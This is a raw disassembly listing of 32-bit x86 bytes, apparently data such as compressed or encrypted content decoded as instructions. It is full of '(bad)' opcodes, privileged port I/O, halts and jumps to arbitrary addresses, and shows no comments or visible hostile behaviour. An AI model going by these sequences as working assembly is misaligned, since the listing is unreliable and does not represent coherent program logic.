  41e677:	test   BYTE PTR [eax-0x68],0x19
  41e67b:	ret    0x358a
  41e67e:	cwde   
  41e67f:	dec    ecx
  41e680:	inc    BYTE PTR [ebp-0x3f]
  41e683:	xlat   BYTE PTR ds:[ebx]
  41e684:	ja     0x41e6e4
  41e686:	in     eax,dx
  41e687:	pop    eax
  41e688:	fstp   DWORD PTR ds:0x96272c10
  41e68e:	cld    
  41e68f:	add    BYTE PTR [eax],0x0
	...
  41e6f2:	add    BYTE PTR [eax],al
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    esi,ebp
  41e701:	in     al,dx
  41e702:	mov    ?,WORD PTR [eax+0x1439c]
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	push   ebp
  41e70d:	jo     0x41e6bd
  41e70f:	dec    edi
  41e710:	test   al,0xcf
  41e712:	les    ecx,FWORD PTR [ecx+0x2bd41dda]
  41e718:	xchg   BYTE PTR [esi+0x5a],bl
  41e71b:	push   ecx
  41e71c:	icebp  
  41e71d:	in     eax,dx
  41e71e:	inc    esi
  41e71f:	(bad)  
  41e720:	not    BYTE PTR [ecx]
  41e722:	(bad)  
  41e724:	xchg   edi,eax
  41e725:	cwde   
  41e726:	out    dx,al
  41e727:	pusha  
  41e728:	cmp    ch,BYTE PTR [bp+si+0xdd]
  41e72d:	gs adc al,0xe3
  41e730:	jo     0x41e78b
  41e732:	sbb    eax,0xb0b4fd23
  41e737:	rol    DWORD PTR [esi+0x4f],cl
  41e73a:	inc    eax
  41e73b:	and    eax,0x5ff29975
  41e740:	aam    0xea
  41e742:	ret    
  41e743:	imul   ebp,edi,0x45
  41e746:	adc    DWORD PTR [ebx-0x1e],0xffffffa2
  41e74a:	stos   DWORD PTR es:[edi],eax
  41e74b:	ss ss add eax,0x2bd4748d
  41e752:	or     al,0x9f
  41e754:	push   es
  41e755:	inc    ebx
  41e756:	rcr    BYTE PTR [edi],cl
  41e758:	sub    DWORD PTR [eax+0x94056a4],esp
  41e75e:	not    BYTE PTR [ebp+0x3dd02b3b]
  41e764:	fwait
  41e765:	sub    DWORD PTR [ebp+edi*2-0x73d0063b],esp
  41e76c:	push   ss
  41e76d:	xchg   ecx,eax
  41e76e:	push   esp
  41e76f:	(bad)  
  41e770:	ss cld 
  41e772:	jl     0x41e7c6
  41e774:	mov    al,0xc
  41e776:	mov    dh,0xa0
  41e778:	hlt    
  41e779:	aad    0x86
  41e77b:	mov    cl,0xd1
  41e77d:	push   edi
  41e77e:	(bad)  
  41e77f:	dec    edi
  41e780:	push   0x4e307051
  41e785:	mov    al,0xda
  41e787:	sub    ah,BYTE PTR [eax-0x16]
  41e78a:	xchg   esp,eax
  41e78b:	ja     0x41e745
  41e78d:	(bad)  
  41e78e:	aad    0xfe
  41e790:	mov    eax,ds:0x857e608a
  41e795:	nop
  41e796:	icebp  
  41e797:	out    0xb4,ax
  41e79a:	xchg   edx,eax
  41e79b:	push   eax
  41e79c:	sbb    eax,esi
  41e79e:	mov    ah,0xff
  41e7a0:	jecxz  0x41e7a4
  41e7a2:	and    DWORD PTR [ecx],0xdf56e43c
  41e7a8:	xchg   esp,eax
  41e7a9:	aas    
  41e7aa:	test   eax,0x4035b050
  41e7af:	inc    ebp
  41e7b0:	lds    ecx,FWORD PTR [edi+0x2]
  41e7b3:	bound  edx,QWORD PTR [eax]
  41e7b5:	mov    dl,0x8a
  41e7b7:	scas   al,BYTE PTR es:[edi]
  41e7b8:	retf   0x96e9
  41e7bb:	inc    esi
  41e7bc:	dec    ebx
  41e7bd:	dec    eax
  41e7be:	push   cs
  41e7bf:	sub    eax,0xe3f8aef7
  41e7c4:	xor    ch,BYTE PTR [ecx+0x2abea5c5]
  41e7ca:	mov    cl,0x6c
  41e7cc:	call   0xbc1f:0x50732d5
  41e7d3:	push   eax
  41e7d4:	js     0x41e79b
  41e7d6:	push   cs
  41e7d7:	xchg   edx,eax
  41e7d8:	loope  0x41e82b
  41e7da:	xlat   BYTE PTR ds:[ebx]
  41e7db:	rol    DWORD PTR [ecx-0x16c2c032],0xb5
  41e7e2:	or     eax,0x4ea41772
  41e7e7:	push   esp
  41e7e8:	mov    esi,0x89251559
  41e7ed:	jnp    0x41e85f
  41e7ef:	idiv   ch
  41e7f1:	imul   edi,DWORD PTR [ebp+ebp*8-0x7],0x2c
  41e7f6:	sub    eax,DWORD PTR [ebx+eax*2+0xb01b8ce]
  41e7fd:	push   ecx
  41e7fe:	xchg   edi,eax
  41e7ff:	or     BYTE PTR [edi+0x68],bl
  41e802:	loop   0x41e845
  41e804:	add    eax,0xd01d9c4b
  41e809:	lock cmp dh,BYTE PTR [edi+0x22f3c1c8]
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8d1
  41e881:	mov    esp,0x44a0a44a
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	fst    QWORD PTR [ecx+ecx*8+0x6dc0e6b1]
  41e893:	dec    edi
  41e894:	mov    DWORD PTR [eax],ebp
  41e896:	jmp    0x41e828
  41e898:	sbb    al,0xc7
  41e89a:	mov    cl,0xa9
  41e89c:	pusha  
  41e89d:	pop    eax
  41e89e:	int3   
  41e89f:	jle    0x41e8e4
  41e8a1:	add    al,0xbc
  41e8a3:	aad    0xad
  41e8a5:	jae    0x41e8de
  41e8a7:	jb     0x41e8b7
  41e8a9:	xor    BYTE PTR [ebx],cl
  41e8ab:	add    dh,BYTE PTR [eax+0x60746fce]
  41e8b1:	cmp    edi,esi
  41e8b3:	push   cs
  41e8b4:	int3   
  41e8b5:	loopne 0x41e907
  41e8b7:	lea    ebx,[esi+0x552598f]
  41e8bd:	push   edi
  41e8be:	retf   0x64ee
  41e8c1:	out    0xf0,al
  41e8c3:	out    0xe8,al
  41e8c5:	aad    0x10
  41e8c7:	mov    ah,0x6a
  41e8c9:	fnstcw WORD PTR [ebp+0x2e]
  41e8cc:	dec    edx
  41e8cd:	jno    0x41e85e
  41e8cf:	adc    DWORD PTR [ecx],esp
  41e8d1:	add    bh,BYTE PTR [esi-0x38c88114]
  41e8d7:	mov    dh,0x6a
  41e8d9:	lds    ebx,FWORD PTR [esi+eax*8-0xb0ebf63]
  41e8e0:	xor    ah,bl
  41e8e2:	cmp    al,0xb0
  41e8e4:	fisttp WORD PTR [esi+0x66]
  41e8e7:	pushf  
  41e8e8:	mov    ah,0x3e
  41e8ea:	and    al,0x9c
  41e8ec:	cld    
  41e8ed:	push   eax
  41e8ee:	add    ecx,DWORD PTR ds:0x2226cdb9
  41e8f4:	cmp    cl,ch
  41e8f6:	pop    esi
  41e8f7:	dec    esi
  41e8f8:	call   0x4a96d2bc
  41e8fd:	and    eax,0x848cd71f
  41e902:	sub    DWORD PTR [ecx-0x2f],edx
  41e905:	add    eax,0x1c37161e
  41e90a:	mov    eax,0xf632d282
  41e90f:	fcom   DWORD PTR [ecx]
  41e911:	cmp    al,0xef
  41e913:	inc    ecx
  41e914:	stc    
  41e915:	sar    ebp,0x25
  41e918:	cli    
  41e919:	inc    edi
  41e91a:	adc    BYTE PTR [edx-0x22],cl
  41e91d:	dec    ebx
  41e91e:	lods   eax,DWORD PTR ds:[esi]
  41e91f:	ins    DWORD PTR es:[edi],dx
  41e920:	sub    ch,BYTE PTR [ebx]
  41e922:	ret    0x24c0
  41e925:	pop    ds
  41e926:	mov    esp,0x1189c566
  41e92b:	sub    eax,0xf0ccfdc9
  41e930:	inc    esp
  41e931:	(bad)  
  41e932:	stc    
  41e933:	jmp    0x41e962
  41e935:	sub    bl,BYTE PTR [eax]
  41e937:	push   ebp
  41e938:	and    eax,0x275df5be
  41e93d:	popa   
  41e93e:	xor    eax,0x627a805a
  41e943:	xchg   ebp,eax
  41e944:	shl    DWORD PTR [ecx],cl
  41e946:	mov    eax,ds:0x840ec355
  41e94b:	enter  0x7dfd,0x4e
  41e94f:	dec    esp
  41e950:	test   ecx,0x41cb9f0b
  41e956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e957:	jno    0x41e933
  41e959:	rcl    DWORD PTR [ebx-0x68ca48f],1
  41e95f:	adc    DWORD PTR [esi+0x3a],0x4e835ef5
  41e966:	sub    ah,BYTE PTR [esi-0x33]
  41e969:	(bad)  
  41e96a:	stos   DWORD PTR es:[edi],eax
  41e96b:	ins    BYTE PTR es:[edi],dx
  41e96c:	add    eax,0xbed601f7
  41e971:	sub    esp,DWORD PTR [edx]
  41e973:	inc    ecx
  41e974:	xchg   edx,eax
  41e975:	mov    esp,0xd80fc585
  41e97a:	add    eax,0x7f3baa45
  41e97f:	daa    
  41e980:	xor    eax,0x571c58be
  41e985:	dec    edx
  41e986:	call   0x6197223a
  41e98b:	scas   al,BYTE PTR es:[edi]
  41e98c:	mov    esp,0xf3da2c
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	xchg   ebp,eax
  41ea01:	inc    edx
  41ea02:	push   ebx
  41ea03:	mov    esp,DWORD PTR [ebp+eax*2+0x1040001]
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	sub    ebp,DWORD PTR [ebp+esi*2+0x7f]
  41ea10:	jns    0x41e9ff
  41ea12:	dec    edi
  41ea13:	out    0x39,eax
  41ea15:	call   0xbdd20dde
  41ea1a:	jl     0x41e9e6
  41ea1c:	mov    esp,0x392ae895
  41ea21:	imul   ebp,DWORD PTR [esi+0x39],0x4e81ed97
  41ea28:	jmp    0x41ea08
  41ea2a:	hlt    
  41ea2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea2c:	enter  0x7b05,0xac
  41ea30:	inc    ecx
  41ea31:	jg     0x41eaad
  41ea33:	ud1    eax,edx
  41ea36:	popa   
  41ea37:	aam    0x60
  41ea39:	outs   dx,BYTE PTR ds:[esi]
  41ea3a:	sbb    al,BYTE PTR ds:0xe4542bb7
  41ea40:	mov    BYTE PTR [edx],0x37
  41ea43:	sub    DWORD PTR [eax-0x12],ecx
  41ea46:	out    0x7d,al
  41ea48:	mov    ecx,0xa7575f77
  41ea4d:	xchg   DWORD PTR [esi-0x13],ebx
  41ea50:	inc    esi
  41ea51:	sti    
  41ea52:	rcl    esp,0x15
  41ea55:	pop    edx
  41ea56:	mov    ch,0x84
  41ea58:	repnz dec esi
  41ea5a:	inc    ebx
  41ea5b:	imul   esp,ebp,0x77
  41ea5e:	outs   dx,DWORD PTR ds:[esi]
  41ea5f:	dec    edi
  41ea60:	loope  0x41ea56
  41ea62:	sbb    ebx,DWORD PTR [eax-0x1a74536c]
  41ea68:	mov    esp,0x8822e48e
  41ea6d:	test   eax,0xf957c705
  41ea72:	and    eax,0x8fb657a4
  41ea77:	cwde   
  41ea78:	aaa    
  41ea79:	(bad)  
  41ea7a:	inc    esi
  41ea7c:	lds    ebp,FWORD PTR [esi-0x34]
  41ea7f:	sbb    BYTE PTR [edi-0x59],bl
  41ea82:	inc    ebx
  41ea83:	mov    bl,0xc5
  41ea85:	fdivr  DWORD PTR [edx-0x62]
  41ea88:	hlt    
  41ea89:	test   BYTE PTR [edx],dl
  41ea8b:	fld    QWORD PTR [edi+0x63]
  41ea8e:	lahf   
  41ea8f:	mov    esi,0x81ddf979
  41ea94:	add    BYTE PTR [esi-0x23473fe3],ah
  41ea9a:	fnstsw WORD PTR [esi+0x54]
  41ea9d:	mov    edi,0x94ce9be3
  41eaa2:	fdiv   st,st(1)
  41eaa4:	test   DWORD PTR [ecx],0x958db7e8
  41eaaa:	not    BYTE PTR [edx+eax*2+0x4136d0c6]
  41eab1:	sbb    sp,WORD PTR [ecx]
  41eab4:	data16 loopne 0x41eaee
  41eab7:	pop    edi
  41eab8:	push   ds
  41eab9:	jg     0x41eb01
  41eabb:	and    eax,0xf64c93b9
  41eac0:	mov    dl,0x2a
  41eac2:	add    eax,0x2855b58e
  41eac7:	les    ebx,FWORD PTR [eax-0x5a93edea]
  41eacd:	xor    al,0xfd
  41eacf:	sbb    edx,edi
  41ead1:	adc    eax,0xc71c7c5e
  41ead6:	sbb    DWORD PTR [ecx+eax*4],0x7ed5e5e
  41eadd:	inc    esi
  41eade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eadf:	or     DWORD PTR [ebx+0x3f],0xb74c50e
  41eae6:	outs   dx,DWORD PTR ds:[esi]
  41eae7:	xor    dh,BYTE PTR [esi]
  41eae9:	retf   0x2e2e
  41eaec:	pop    ebp
  41eaed:	jl     0x41eb53
  41eaef:	loop   0x41eb13
  41eaf1:	call   0x194c72a0
  41eaf6:	push   ebp
  41eaf7:	cmp    al,0x13
  41eaf9:	sar    BYTE PTR [edi+0x3d],0x59
  41eafd:	fld1   
  41eaff:	jbe    0x41eaf8
  41eb01:	push   esp
  41eb02:	xlat   BYTE PTR ds:[ebx]
  41eb03:	es xchg ecx,eax
  41eb05:	inc    edx
  41eb06:	in     al,0xdc
  41eb08:	(bad)
  41eb0c:	cdq    
  41eb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb0e:	repz or al,0x0
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x24
  41eb81:	fiadd  DWORD PTR [ebx+ebx*1]
  41eb84:	test   al,0x46
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	cli    
  41eb8d:	rcl    BYTE PTR [edi],1
  41eb8f:	cmp    ch,al
  41eb91:	xchg   esi,eax
  41eb92:	add    BYTE PTR [eax+ebp*4-0x23],bl
  41eb96:	xchg   esi,esi
  41eb98:	mov    bh,0xd7
  41eb9a:	in     al,0xcc
  41eb9c:	inc    edi
  41eb9d:	cdq    
  41eb9e:	or     bl,al
  41eba0:	jns    0x41eb8a
  41eba2:	aad    0xf1
  41eba4:	test   DWORD PTR [eax+0x5805e9c6],edx
  41ebaa:	bound  edi,QWORD PTR [edx-0x416e6047]
  41ebb0:	jnp    0x41ebee
  41ebb2:	mov    ds:0x8e381795,al
  41ebb7:	mov    eax,ds:0x5ca3399a
  41ebbc:	adc    DWORD PTR [ebp+0xe],ebp
  41ebbf:	inc    esi
  41ebc0:	(bad)  
  41ebc1:	in     eax,0x4a
  41ebc3:	mov    al,0x7
  41ebc5:	inc    esp
  41ebc6:	dec    ebx
  41ebc7:	xlat   BYTE PTR ds:[ebx]
  41ebc8:	ss adc eax,0x94beb40b
  41ebce:	sahf   
  41ebcf:	jl     0x41ec3f
  41ebd1:	or     esp,DWORD PTR [edi+0x4be7be58]
  41ebd7:	mov    edx,0xc60e6663
  41ebdc:	jle    0x41ec53
  41ebde:	mov    esp,0x38d1f164
  41ebe3:	cmp    ebx,DWORD PTR [eax-0x2c]
  41ebe6:	mov    esp,0xba377921
  41ebeb:	mov    ebp,0xbd33c32b
  41ebf0:	pop    edx
  41ebf1:	es adc ebp,esi
  41ebf4:	mov    dh,0xb5
  41ebf6:	xor    eax,0x7743d3a4
  41ebfb:	fwait
  41ebfc:	out    0x1d,eax
  41ebfe:	mov    ch,0x83
  41ec00:	add    BYTE PTR [ebp+edx*8-0x66],ch
  41ec04:	jle    0x41ec70
  41ec06:	dec    ecx
  41ec07:	dec    ebp
  41ec08:	aad    0xf3
  41ec0a:	(bad)  
  41ec0b:	jns    0x41ebb1
  41ec0d:	push   ecx
  41ec0e:	test   DWORD PTR ds:0xd2e56ada,edi
  41ec14:	sar    BYTE PTR [eax],cl
  41ec16:	dec    edi
  41ec17:	cli    
  41ec18:	test   ecx,ebx
  41ec1a:	test   ecx,eax
  41ec1c:	and    DWORD PTR [esi],edx
  41ec1e:	xchg   esp,eax
  41ec1f:	into   
  41ec20:	ins    DWORD PTR es:[edi],dx
  41ec21:	popf   
  41ec22:	enter  0x4e92,0xd7
  41ec26:	jge    0x41ec52
  41ec28:	repz pop edx
  41ec2a:	xchg   BYTE PTR [ecx+ebx*1],al
  41ec2d:	rcl    DWORD PTR [edi+0x7d],0x14
  41ec31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec32:	jecxz  0x41ebfe
  41ec34:	jmp    0x41ec61
  41ec36:	cmp    dl,ah
  41ec38:	(bad)  
  41ec39:	pop    edi
  41ec3a:	jp     0x41ec01
  41ec3c:	cld    
  41ec3d:	es and al,0x96
  41ec40:	rcr    DWORD PTR [ebx-0x1eb9fca1],0xc2
  41ec47:	(bad)  
  41ec48:	dec    ecx
  41ec49:	xchg   esi,eax
  41ec4a:	(bad)  
  41ec4c:	or     eax,esp
  41ec4e:	test   al,0x6c
  41ec50:	dec    ecx
  41ec51:	mov    eax,ds:0x7638655b
  41ec56:	inc    esp
  41ec57:	xchg   esp,eax
  41ec58:	retf   0x4389
  41ec5b:	dec    ebx
  41ec5c:	ins    BYTE PTR es:[edi],dx
  41ec5d:	pop    ds
  41ec5e:	and    cl,BYTE PTR [esi+0x1d7c565d]
  41ec64:	mov    ebx,0xceaf262e
  41ec69:	loope  0x41ec7b
  41ec6b:	xchg   esp,eax
  41ec6c:	mov    edi,0xabadf660
  41ec71:	mov    DWORD PTR [eax-0x7f48ebd6],esi
  41ec77:	sub    cl,BYTE PTR ds:0x90d5440a
  41ec7d:	mov    cl,0x38
  41ec7f:	jl     0x41ecf3
  41ec81:	or     eax,0xfbbdff86
  41ec86:	out    dx,al
  41ec87:	cmp    BYTE PTR [ecx+0x79],dh
  41ec8a:	push   ebp
  41ec8b:	mov    al,ds:0x965d9f02
	...
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x23795fd0
  41ed02:	pop    ecx
  41ed03:	xchg   esi,eax
  41ed04:	lods   al,BYTE PTR ds:[esi]
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	xchg   ebp,eax
  41ed0d:	pop    edx
  41ed0e:	ja     0x41ec9a
  41ed10:	jb     0x41ed58
  41ed12:	add    eax,0x90a30baa
  41ed17:	sbb    DWORD PTR [eax+0x75],eax
  41ed1a:	cmp    esp,esp
  41ed1c:	xchg   DWORD PTR [ebx+eiz*4-0x39a9d594],edx
  41ed23:	lods   eax,DWORD PTR ds:[esi]
  41ed24:	jb     0x41ecea
  41ed26:	shr    BYTE PTR [ebx+ebp*8-0x9],1
  41ed2a:	add    ah,BYTE PTR [ebp-0x59cd9c0b]
  41ed30:	mov    ecx,DWORD PTR [eax-0x70]
  41ed33:	xchg   DWORD PTR [ebx],eax
  41ed35:	push   0xffffff8c
  41ed37:	nop
  41ed38:	adc    DWORD PTR [ebp-0x77e843de],ecx
  41ed3e:	hlt    
  41ed3f:	push   ds
  41ed40:	in     al,dx
  41ed41:	dec    ebp
  41ed42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed43:	vpaddd xmm4,xmm4,xmm7
  41ed47:	lock fs xchg edi,eax
  41ed4a:	das    
  41ed4b:	push   esp
  41ed4c:	push   ebp
  41ed4d:	sub    BYTE PTR [eax-0x1563c032],bh
  41ed53:	repnz cmp DWORD PTR [edi],esp
  41ed56:	cmp    esi,DWORD PTR [ebx]
  41ed58:	rcl    BYTE PTR [esi+0x36],1
  41ed5b:	fcom   DWORD PTR [edx+0x520708d8]
  41ed61:	(bad)  
  41ed63:	js     0x41ed65
  41ed65:	and    BYTE PTR [eax],dl
  41ed67:	adc    ebx,0xa1d5e689
  41ed6d:	fadd   QWORD PTR [esi-0x1b86e0fa]
  41ed73:	and    edi,DWORD PTR [esi]
  41ed75:	lods   eax,DWORD PTR ds:[esi]
  41ed76:	jge    0x41eddc
  41ed78:	lods   al,BYTE PTR ds:[esi]
  41ed79:	mov    BYTE PTR [edx-0x5b],dl
  41ed7c:	mov    ds:0x468a5245,al
  41ed81:	shr    DWORD PTR [eax+0x5e75e503],cl
  41ed87:	cmp    BYTE PTR [ecx],ch
  41ed89:	lds    ebx,FWORD PTR [edi+0x9]
  41ed8c:	fsub   st,st(4)
  41ed8e:	jg     0x41eda7
  41ed90:	int3   
  41ed91:	pop    esp
  41ed92:	fsub   DWORD PTR [edx+0x0]
  41ed95:	repz in al,0x83
  41ed98:	in     eax,0xfa
  41ed9a:	inc    ebp
  41ed9b:	inc    edx
  41ed9c:	ret    
  41ed9d:	cmp    ebx,DWORD PTR [ebx-0x58]
  41eda0:	xchg   ecx,eax
  41eda1:	cmc    
  41eda2:	sar    bh,0xe0
  41eda5:	lods   al,BYTE PTR ds:[esi]
  41eda6:	xchg   ecx,eax
  41eda7:	sub    eax,0x80568262
  41edac:	cdq    
  41edad:	les    esi,FWORD PTR [edi-0x5344466b]
  41edb3:	cld    
  41edb4:	mov    al,ds:0xadce710c
  41edb9:	pusha  
  41edba:	mov    bh,0x7c
  41edbc:	test   al,0xf2
  41edbe:	push   ebp
  41edbf:	xor    ch,BYTE PTR [esi+ebx*8-0x52d59acf]
  41edc6:	stc    
  41edc7:	(bad)  
  41edc8:	clc    
  41edc9:	test   BYTE PTR [ebx-0x2c],ah
  41edcc:	(bad)  
  41edcd:	cwde   
  41edce:	fdivp  st(4),st
  41edd0:	lods   al,BYTE PTR ds:[esi]
  41edd1:	(bad)  
  41edd3:	sub    eax,0xb988a0d5
  41edd8:	mov    dl,0x97
  41edda:	imul   eax,DWORD PTR [eax+0x2],0xc7270313
  41ede1:	jp     0x41edfc
  41ede3:	ret    0x5e6e
  41ede6:	mov    ch,0x97
  41ede8:	call   0xbd72:0xdfa23dae
  41edef:	adc    al,0x7a
  41edf1:	div    BYTE PTR [ecx-0x33]
  41edf4:	lods   al,BYTE PTR ds:[esi]
  41edf5:	repz cmp bl,BYTE PTR [esi-0x41]
  41edf9:	loop   0x41edec
  41edfb:	cmp    eax,0x14d3d57c
  41ee00:	in     eax,0xb8
  41ee02:	sbb    BYTE PTR [ecx+0x6385937b],ah
  41ee08:	mov    al,0xbd
  41ee0a:	push   edi
  41ee0b:	mov    ebp,0x59196804
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb029:0x7837fee7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	cmp    dl,ah
  41ee8e:	fmul   QWORD PTR [edx]
  41ee90:	daa    
  41ee91:	(bad)  
  41ee92:	int    0x4e
  41ee94:	push   ss
  41ee95:	retf   
  41ee96:	inc    esp
  41ee97:	fadd   QWORD PTR [eax-0x4b5c57e6]
  41ee9d:	push   edi
  41ee9e:	lock pop esi
  41eea0:	in     al,dx
  41eea1:	pop    ds
  41eea2:	push   ebx
  41eea3:	call   0xaaa3e60f
  41eea8:	adc    dh,BYTE PTR [edx+0x3]
  41eeab:	lods   al,BYTE PTR ds:[esi]
  41eeac:	repnz jmp 0x3fd8:0x39d51610
  41eeb4:	mov    esp,edx
  41eeb6:	sub    ch,BYTE PTR ds:0x67c25a96
  41eebc:	jo     0x41eeab
  41eebe:	div    BYTE PTR [eax-0x56]
  41eec1:	and    BYTE PTR [edx],bl
  41eec3:	ins    BYTE PTR es:[edi],dx
  41eec4:	mov    edi,0x6499ba2c
  41eec9:	push   cs
  41eeca:	nop
  41eecb:	in     al,dx
  41eecc:	xor    al,0xeb
  41eece:	(bad)  
  41eecf:	sbb    bl,BYTE PTR [ecx-0x53]
  41eed2:	cdq    
  41eed3:	and    eax,0x27f3fae5
  41eed8:	in     al,dx
  41eed9:	cmp    edx,DWORD PTR gs:[ebp-0x3551b8cc]
  41eee0:	jb     0x41eeff
  41eee2:	mov    bh,0x94
  41eee4:	and    BYTE PTR [eax+0x1],0xff
  41eee8:	sti    
  41eee9:	xor    DWORD PTR [ebx],edx
  41eeeb:	cld    
  41eeec:	popa   
  41eeed:	inc    esi
  41eeee:	iret   
  41eeef:	stc    
  41eef0:	cmp    edx,esp
  41eef2:	outs   dx,DWORD PTR ds:[esi]
  41eef3:	test   BYTE PTR [eax+0x3c979fa4],cl
  41eef9:	lods   al,BYTE PTR ds:[esi]
  41eefa:	inc    edi
  41eefb:	xor    eax,0xf490dcf6
  41ef00:	xchg   ecx,eax
  41ef01:	and    DWORD PTR [eax+0x5f],ecx
  41ef04:	add    al,0x41
  41ef06:	repnz bound esi,QWORD PTR [ecx+eiz*1-0x42]
  41ef0b:	adc    al,0xe
  41ef0d:	in     eax,0x1a
  41ef0f:	js     0x41eef5
  41ef11:	(bad)  
  41ef12:	fsubrp st(1),st
  41ef14:	popf   
  41ef15:	xchg   ebp,eax
  41ef16:	(bad)  
  41ef17:	out    dx,al
  41ef18:	pop    edi
  41ef19:	xlat   BYTE PTR ds:[ebx]
  41ef1a:	and    BYTE PTR [edi],bh
  41ef1c:	pop    ebp
  41ef1d:	mov    ah,0x19
  41ef1f:	imul   ebp,DWORD PTR [eax-0x628ee295],0x3bc17ff
  41ef29:	imul   edx,DWORD PTR [edi],0x64
  41ef2c:	add    BYTE PTR [ebp+eax*1+0xcc3056f],ah
  41ef33:	call   0x8be83de3
  41ef38:	sbb    eax,0x6738cb02
  41ef3d:	jno    0x41eee3
  41ef3f:	mov    ebp,0xfd9af0f9
  41ef44:	sbb    ebx,edx
  41ef46:	frstor [edx]
  41ef48:	xor    DWORD PTR [ebx],edi
  41ef4a:	sbb    DWORD PTR [ecx+0x65f0033f],edi
  41ef50:	test   al,0x4e
  41ef52:	fwait
  41ef53:	in     eax,dx
  41ef54:	sub    BYTE PTR [esi+ebp*1-0x73d6cfd9],0x15
  41ef5c:	push   eax
  41ef5d:	or     eax,0x7bc296b3
  41ef62:	pop    edi
  41ef63:	sub    DWORD PTR [ebp+ebp*1-0x4b404e9c],ecx
  41ef6a:	shr    BYTE PTR [eax+esi*2],1
  41ef6d:	(bad)  
  41ef6e:	dec    edx
  41ef6f:	mov    ds,WORD PTR [edi]
  41ef71:	ins    DWORD PTR es:[edi],dx
  41ef72:	retf   0x6ed8
  41ef75:	sbb    al,0x94
  41ef77:	mov    al,ds:0xc1654206
  41ef7c:	cmp    ebp,edi
  41ef7e:	adc    al,0x78
  41ef80:	sub    BYTE PTR [ebx+0x0],ch
  41ef83:	out    0xc0,al
  41ef85:	mov    ebp,0xbf758969
  41ef8a:	jmp    0x4c3fc89c
  41ef8f:	imul   eax,DWORD PTR [eax],0x0
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebp,DWORD PTR [ebx],0xffffff88
  41f002:	push   cs
  41f003:	add    esi,DWORD PTR [ecx+ecx*2+0x1040001]
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	dec    esp
  41f00d:	fisttp QWORD PTR [edx]
  41f00f:	ja     0x41f026
  41f011:	fsubr  DWORD PTR [edi]
  41f013:	mov    ecx,0x9f77236a
  41f018:	mov    bl,BYTE PTR [eax+esi*2-0x28]
  41f01c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f01d:	mov    cl,0x90
  41f01f:	mov    ebx,0x904cf6f6
  41f024:	sub    al,0xea
  41f026:	push   ds
  41f027:	jp     0x41f07a
  41f029:	cmc    
  41f02a:	cmp    edi,DWORD PTR [esi-0x30]
  41f02d:	dec    edx
  41f02e:	xchg   esp,eax
  41f02f:	inc    ebp
  41f030:	in     eax,0xd2
  41f032:	mov    dl,0xdf
  41f034:	es in  al,0x24
  41f037:	sub    bl,ah
  41f039:	or     DWORD PTR [eax],0xffffffbb
  41f03c:	imul   ecx,DWORD PTR [ecx-0x49],0xffffff9d
  41f040:	xor    edx,DWORD PTR [edx-0x71a5444b]
  41f046:	iret   
  41f047:	pop    es
  41f048:	ss gs cmp eax,0x30fa66c7
  41f04f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f050:	shl    BYTE PTR [edi-0x5ff8417b],1
  41f056:	adc    al,0xaa
  41f058:	xor    al,0x6d
  41f05a:	out    dx,al
  41f05b:	fmul   st,st(2)
  41f05d:	loop   0x41f0a8
  41f05f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f060:	add    BYTE PTR [eax+0x1b],0x64
  41f064:	and    al,BYTE PTR [ecx+0x1a]
  41f067:	sub    eax,0x26848f99
  41f06c:	clc    
  41f06d:	sti    
  41f06e:	mov    dh,0xab
  41f070:	rol    esp,cl
  41f072:	aas    
  41f073:	mov    ds:0xf311126f,eax
  41f078:	xchg   bh,bh
  41f07a:	ret    0xc623
  41f07d:	out    0x99,al
  41f07f:	(bad)  
  41f080:	ds inc eax
  41f082:	les    eax,FWORD PTR [ebp+eax*4+0x47]
  41f086:	(bad)  
  41f088:	mov    ds:0x5a45de86,al
  41f08d:	dec    ebx
  41f08e:	loopne 0x41f0cb
  41f090:	adc    ecx,ebp
  41f092:	ret    0xb83f
